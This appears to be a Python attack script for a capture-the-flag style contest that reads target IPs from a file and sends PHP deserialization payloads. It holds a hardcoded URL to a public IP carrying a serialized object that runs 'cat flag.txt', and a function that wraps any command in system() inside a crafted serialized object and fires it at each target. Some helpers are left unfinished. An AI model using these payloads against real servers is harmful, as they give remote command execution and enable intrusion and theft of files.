import requests
import re


def getipl():
    ret = []
    with open('ipl.txt', 'rb') as f:
        bin_str = ''
        for line in f.readlines():
            stegb64 = str(line, "utf-8").strip("\r\n")
            ret.append(stegb64)
    return ret


def curl(urlt, urlh="http://"):
    return [urlh + ip + "/" + urlt for ip in getipl()]


def get(url, params={}):
    params['Timeout'] = 1
    requests.Timeout = 0.1
    request = requests.get(url, params=params)
    return request.text


def post(url, params={}, tout=(0.5, 1)):
    request = requests.post(url, data=params, timeout=tout)
    return request.text


url = 'http://47.93.57.24:7779/index.php?dage=O:4:"site":3:{s:3:"url";s:1:"h";s:4:"name";s:6:"system";s:5:"title";s:12:"cat flag.txt";}'


# 反序列化
def fxlh1(ip, cmd):
    cmdx = "system('" + cmd + "');"
    phpD = "http://" + ip
    phpD += '/ser.php?test=O:5:"Smi1e":1:{s:11:"%00*%00ClassObj";O:6:"unsafe":1:{s:12:"%00unsafe%00data";s:'
    phpD += str(len(cmdx))
    phpD += ':"'
    phpD += cmdx
    phpD += '";}}'
    ret = ""

    try:
        ret = get(phpD)
        # ret =ret.replace("b'","")
        # ret =ret[:-1]
    except:
        ret += "Error"
    return ret


def tfl(txt):
    ret = txt
    ret = ret.replace("\\r", "")
    ret = ret.replace("\\n", "")

    ret = ret.replace(" ", "")
    ret = ret.replace("'", "")
    ret += "}"


url = 'http://localhost/update.php'
ag = {'age': 1, 'nickname': 'a'}
print(post(url))
